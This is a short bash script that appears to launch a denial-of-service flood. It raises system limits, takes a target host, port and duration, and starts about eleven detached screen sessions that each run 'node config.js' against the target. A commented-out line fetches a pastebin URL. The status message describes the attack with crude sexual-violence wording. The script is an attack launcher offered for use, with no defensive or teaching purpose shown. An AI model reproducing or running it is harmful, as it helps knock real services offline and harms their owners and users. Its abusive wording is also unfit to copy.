#!/bin/bash

sysctl -w fs.inotify.max_user_watches=1000000;
ulimit -HSn 999999;

counter=0
threads=10
target=$1
port=$2
time=$3

clear
#curl https://pastebin.com/raw/hhWcCArD; echo -e "\n\n"
echo -e "raping $target (port $port) for $time seconds (12 threads)\n"

while [ $counter -le $threads ]
do
  screen -dms 1 node config.js $target $port $time
  ((counter++))
done
